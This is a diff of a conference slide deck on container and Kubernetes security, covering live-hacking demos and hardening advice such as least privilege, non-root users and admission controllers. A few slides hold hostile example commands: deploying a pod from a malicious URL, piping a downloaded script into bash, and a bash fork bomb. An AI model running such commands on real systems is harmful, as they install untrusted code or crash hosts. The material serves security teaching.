@@ -1,9 +1,11 @@
 # [fit] What vulnerabilities? 
-## [fit] Live hacking of containers and orchestrators
+## [fit] *Live hacking of containers and orchestrators*
 
 ---
 
 # [fit] Take photos
+
+## [fit] *#ndcoslo*
 
 ---
 
@@ -172,7 +174,7 @@ I looked at one of his talks.
 
 ---
 
-# [fit] Thank you
+# [fit] *Thank you*
 
 ## Andrew Martin
 ### *@sublimino*
@@ -447,7 +449,7 @@ Some people just have binaries running in their images.
 
 ---
 
-# Private container registries
+# *Private* container registries
 
 ^
 Public is great.
@@ -458,7 +460,7 @@ Also other offerings.
 
 ---
 
-# How do we define our images?
+# How do we *define* our images?
 
 ---
 
@@ -483,14 +485,26 @@ Maybe overkill but we specifically know the image being run
 
 ---
 
-# [fit] Image trust and supply chain
+# [fit] *Always* 
+
+# [fit] pull latest
+
+^
+Caching images can be great for local dev.
+If you're on a train for example.
+Pulling down images isn't great on mobile.
+In production this is different.
+
+---
+
+# [fit] *Image trust* and supply chain
 
 ^
 How do we know what we're running is what we built?
 
 ---
 
-# [fit] Case study
+# [fit] *Case study*
 
 ## [fit] tylenol cyanide deaths
 
@@ -508,11 +522,13 @@ How do we know what we're running is what we built?
 
 ---
 
-# Potential risks
+# [fit] Running *containers*
 
-^
-To be secure, we need to know how.
-So what are our risks.
+# [fit] on *Kubernetes*
+
+---
+
+# [fit] What could *possibly* go wrong?
 
 ---
 
@@ -539,15 +555,11 @@ So what are our risks.
 
 # [fit] Run compromised Pod
 
-`kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml`
-
 ---
 
-# Social Engineering
-
-## Example
-
----
+```
+$ kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml
+```
 
 ```
 $ curl SRI-Tools.com/fakeapp.sh | bash
@@ -556,15 +568,166 @@ $ Kubectl create –f http://SRI-Tools.com/k8s/FakeApp.yaml
 
 ---
 
+# [fit] *Secure* by default yeah?
+
+---
+
 ![autoplay](assets/k8-english.mp4)
 
 ---
 
-# Kubernetes best practices
+# [fit] *Feature* driven
 
 ---
 
-# Least Privileged
+# [fit] Security *follows
+
+---
+
+# [fit] Best *Practice*
+
+---
+
+# Least *Privileged*
+
+^
+Focus on this with task at hand.
+
+---
+
+# Reduce *host mounts*
+
+^
+More dependencies onto a node can cause more issues.
+
+---
+
+# [fit] *Limit* communications
+
+^
+A cluster has its own network.
+If everything can connect to eachother, bad things can happen.
+
+---
+
+# Don't use *root*
+
+^
+A few exceptions.
+Running on the nodes kernel.
+Running on privaledged ports on the node.
+K8S services.
+Installing things onto the container.
+Decent CI/CD should prevent this from happening.
+
+---
+
+# How to run as a non-root user?
+
+---
+
+# User command in Dockerfile.
+
+--
+
+# Potential risks: *API*
+
+---
+
+# Master and Workers
+
+---
+
+# Control Plane
+
+---
+
+# API
+
+---
+
+# [fit] Demo *2*
+
+## [fit] Show me the *api*
+
+---
+
+# [fit] *Admission* controller
+
+^
+This happens after authentication and authorisation.
+Will discuss that after.
+Before committing this into etcd.
+There are lots of admission controllers to choose from.
+Here's a selection.
+
+---
+
+# [fit] AlwaysPullImages
+
+^
+Modifies pod pull policy to always overwriting default.
+If other pods run on the same node, they use the cached image.
+This avoids registry checks.
+
+---
+
+# [fit] DenyEscalatingExec
+
+^
+Prevent exec and attach command to escalated pods.
+Stop getting into privileged containers.
+
+---
+
+# PodSecurityPolicy
+
+^
+This determines how a pod can be run.
+Determines if it should be run based on policies.
+
+---
+
+# TODO: More information on PodSecurityPolicies
+
+---
+
+# [fit] LimitRange
+# [fit] ResourceQuota
+
+^
+Observes incoming requests.
+Ensures it doesn't violate any of the constraints.
+Helps prevent ddos attacks.
+
+---
+
+# ResourceQuota
+
+| Name | Description |
+| --- | --- |
+| cpu | Total requested cpu usage |
+| memory | Total requested memory usage |
+| pods | Total number of active pods where phase is pending or active.|
+| services | Total number of services |
+| replicationcontrollers | Total number of replication controllers |
+| resourcequotas | Total number of resource quotas |
+| secrets | Total number of secrets |
+| persistentvolumeclaims | Total number of persistent volume claims |
+
+^
+Example of what we can limit with a resource quota.
+
+---
+
+# [fit]NodeRestrictions
+
+^
+Limits the restrictions on the kubelet.
+
+---
+
+# TODO: Kubelet
 
 ---
 
@@ -656,21 +819,6 @@ By Default there is no  Selinux/AppArmor/seccomp profile
 ---
 
 # [fit] :(){ :|:& };:
-
----
-
-# ResourceQuota
-
-| Name | Description |
-| --- | --- |
-| cpu | Total requested cpu usage |
-| memory | Total requested memory usage |
-| pods | Total number of active pods where phase is pending or active.|
-| services | Total number of services |
-| replicationcontrollers | Total number of replication controllers |
-| resourcequotas | Total number of resource quotas |
-| secrets | Total number of secrets |
-| persistentvolumeclaims | Total number of persistent volume claims |
 
 ---
 
